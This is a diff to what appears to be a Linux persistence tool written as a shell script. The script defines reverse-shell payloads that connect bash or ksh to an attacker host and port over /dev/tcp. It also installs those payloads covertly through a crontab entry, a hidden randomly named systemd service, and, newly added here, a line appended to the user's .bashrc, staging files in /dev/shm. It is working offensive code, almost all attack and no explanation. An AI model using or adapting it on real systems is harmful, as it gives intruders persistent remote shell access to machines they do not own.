@@ -6,14 +6,19 @@ attackPort=5253
 cron="* * * * *"
 payload=tmpayload
 
+touch /dev/shm/.linpay
+
 methods=(
+	# method, eval statement, payload
 	"ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"bash,if bash -c 'exit',bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 )
 
 doors=(
+	# door, eval statement, hinge
 	"crontab,if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron,echo \"$cron $(cat /dev/shm/.linpay)\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:" 
 	"systemctl,if touch /etc/systemd/.temp; rm /etc/systemd/.temp,export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
+	"bashrc,if cd;find -writable -name .bashrc | grep -qi bashrc,echo \"$(cat /dev/shm/.linpay) 2> /dev/null & sleep .0001\" >> ~/.bashrc"
 )
 
 #return method and payload of available
